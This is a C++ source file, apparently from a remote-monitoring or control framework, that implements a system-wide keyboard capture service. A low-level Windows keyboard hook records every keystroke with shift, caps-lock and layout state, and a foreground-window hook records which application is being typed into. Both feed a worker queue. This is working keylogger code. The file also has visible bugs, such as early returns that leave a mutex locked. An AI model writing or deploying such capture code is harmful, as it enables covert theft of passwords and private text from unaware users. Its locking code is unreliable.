#include "services.hpp"

#if SERVICE_KEYBOARD_ENABLED

#include "winfx.hpp"
#include "tools.hpp"

#include <atomic>
#include <mutex>

using namespace Services;
using namespace LRCData;

namespace
{
	std::atomic_bool isRunning = false;

	std::mutex stateMutex;

	HHOOK hookKeyboard = NULL;
	HWINEVENTHOOK hookForegroundWindow = NULL;

	void CALLBACK HandleWinEvent(HWINEVENTHOOK hook, DWORD event, HWND hwnd,
		LONG idObject, LONG idChild, DWORD dwEventThread, DWORD dwmsEventTime)
	{
		WNDInfo wndInfo = tools::GetWNDInfo(hwnd);

		KeyboardWorker::Add(wndInfo);
	}

	// Low level keyboard callback function
	LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
	{
		if (wParam == WM_KEYDOWN)
		{
			KBDLLHOOKSTRUCT* dllHookStruct = (KBDLLHOOKSTRUCT*)lParam;

			bool isShift = (GetKeyState(VK_SHIFT) & 0x8000) != 0;
			bool isCapsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

			PartKeyboard pk;
			pk.subtype = LRCDATA_KEYBOARD_SUBTYPE_VKINFO;
			pk.vkInfo.keyCode = dllHookStruct->vkCode;
			pk.vkInfo.lang = WORD(GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL)));
			pk.vkInfo.flags = isShift && isCapsLock ? 0x3 : isShift ? 0x1 : isCapsLock ? 0x2 : 0x0;

			KeyboardWorker::Add(pk.vkInfo);
		}

		return CallNextHookEx(hookKeyboard, nCode, wParam, lParam);
	}
}

void Keyboard::Run()
{
	stateMutex.lock();

	if (isRunning.load())
	{
		return;
	}

	isRunning.store(true);

	if (hookKeyboard == NULL)
	{
		hookKeyboard = SetWindowsHookExW(WH_KEYBOARD_LL, LowLevelKeyboardProc, NULL, NULL);
	}

	if (hookForegroundWindow == NULL)
	{
		hookForegroundWindow = SetWinEventHook(
			EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL,
			HandleWinEvent, 0, 0, WINEVENT_OUTOFCONTEXT | WINEVENT_SKIPOWNPROCESS);
	}

	stateMutex.unlock();
}

void Keyboard::Stop()
{
	stateMutex.lock();

	if (!isRunning.load())
	{
		return;
	}

	isRunning.store(false);

	if (hookKeyboard != NULL)
	{
		UnhookWindowsHookEx(hookKeyboard);
		hookKeyboard = NULL;
	}

	if (hookForegroundWindow != NULL)
	{
		UnhookWinEvent(hookForegroundWindow);
	}

	stateMutex.unlock();
}

bool Keyboard::IsRunning()
{
	return isRunning;
}

#endif // SERVICE_KEYBOARD_ENABLED